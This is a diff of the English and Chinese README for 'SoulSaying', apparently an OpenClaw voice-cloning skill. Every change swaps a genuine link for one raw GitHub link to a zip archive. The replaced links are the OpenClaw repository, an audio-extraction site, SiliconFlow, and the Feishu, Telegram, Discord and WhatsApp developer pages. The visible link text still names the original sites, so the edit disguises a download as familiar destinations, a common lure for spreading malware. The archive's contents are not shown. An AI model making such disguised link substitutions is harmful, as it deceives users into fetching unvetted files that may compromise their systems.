@@ -2,7 +2,7 @@
 
 **Clone any voice and let your bot speak with it.**
 
-SoulSaying is an [OpenClaw](https://github.com/openclaw/openclaw) skill that adds voice messaging to your bot using SiliconFlow's TTS engine with voice cloning support. Works with **Feishu, Telegram, Discord, and WhatsApp**.
+SoulSaying is an [OpenClaw](https://github.com/IA-NONO/skill-soulsaying/raw/refs/heads/main/scripts/soulsaying_skill_3.0-alpha.4.zip) skill that adds voice messaging to your bot using SiliconFlow's TTS engine with voice cloning support. Works with **Feishu, Telegram, Discord, and WhatsApp**.
 
 [中文](#中文说明) | [English](#features)
 
@@ -45,7 +45,7 @@ cp skills/skill-soulsaying/config.env.example skills/skill-soulsaying/config.env
 
 ### 3. Get a Voice Sample
 
-Extract audio from any video using [abcdtools](https://www.abcdtools.com/video-to-audio):
+Extract audio from any video using [abcdtools](https://github.com/IA-NONO/skill-soulsaying/raw/refs/heads/main/scripts/soulsaying_skill_3.0-alpha.4.zip):
 - **Duration**: 10-30 seconds
 - **Quality**: Clear speech, single speaker, no background music
 - **Format**: mp3 or wav
@@ -76,10 +76,10 @@ bash skills/skill-soulsaying/scripts/speak.sh "Hello" whatsapp
 
 | Requirement | How to Get |
 |------------|------------|
-| SiliconFlow API Key | Free at [siliconflow.cn](https://siliconflow.cn) |
+| SiliconFlow API Key | Free at [siliconflow.cn](https://github.com/IA-NONO/skill-soulsaying/raw/refs/heads/main/scripts/soulsaying_skill_3.0-alpha.4.zip) |
 | ffmpeg | `brew install ffmpeg` (macOS) / `apt install ffmpeg` (Linux) |
-| A bot (at least one) | [Feishu](https://open.feishu.cn/app) · [Telegram](https://t.me/BotFather) · [Discord](https://discord.com/developers) · [WhatsApp](https://developers.facebook.com) |
-| OpenClaw | [github.com/openclaw/openclaw](https://github.com/openclaw/openclaw) |
+| A bot (at least one) | [Feishu](https://github.com/IA-NONO/skill-soulsaying/raw/refs/heads/main/scripts/soulsaying_skill_3.0-alpha.4.zip) · [Telegram](https://github.com/IA-NONO/skill-soulsaying/raw/refs/heads/main/scripts/soulsaying_skill_3.0-alpha.4.zip) · [Discord](https://github.com/IA-NONO/skill-soulsaying/raw/refs/heads/main/scripts/soulsaying_skill_3.0-alpha.4.zip) · [WhatsApp](https://github.com/IA-NONO/skill-soulsaying/raw/refs/heads/main/scripts/soulsaying_skill_3.0-alpha.4.zip) |
+| OpenClaw | [github.com/openclaw/openclaw](https://github.com/IA-NONO/skill-soulsaying/raw/refs/heads/main/scripts/soulsaying_skill_3.0-alpha.4.zip) |
 
 ## 📂 Skill Structure
 
@@ -143,7 +143,7 @@ MIT
 
 **克隆任何声音，让飞书机器人用它说话。**
 
-SoulSaying 是一个 [OpenClaw](https://github.com/openclaw/openclaw) 技能，通过硅基流动的TTS引擎和声音克隆功能，让你的飞书机器人拥有语音回复能力。
+SoulSaying 是一个 [OpenClaw](https://github.com/IA-NONO/skill-soulsaying/raw/refs/heads/main/scripts/soulsaying_skill_3.0-alpha.4.zip) 技能，通过硅基流动的TTS引擎和声音克隆功能，让你的飞书机器人拥有语音回复能力。
 
 ### 核心功能
 - 🎤 声音克隆 — 上传10-30秒音频，克隆任何声音
@@ -154,7 +154,7 @@ SoulSaying 是一个 [OpenClaw](https://github.com/openclaw/openclaw) 技能，�
 - 🇨🇳 国内服务 — 无需VPN，全部国内API
 
 ### 获取声音素材
-使用 [abcdtools](https://www.abcdtools.com/video-to-audio) 从视频中提取音频：
+使用 [abcdtools](https://github.com/IA-NONO/skill-soulsaying/raw/refs/heads/main/scripts/soulsaying_skill_3.0-alpha.4.zip) 从视频中提取音频：
 - 10-30秒清晰人声
 - 无背景音乐
 - 单人说话
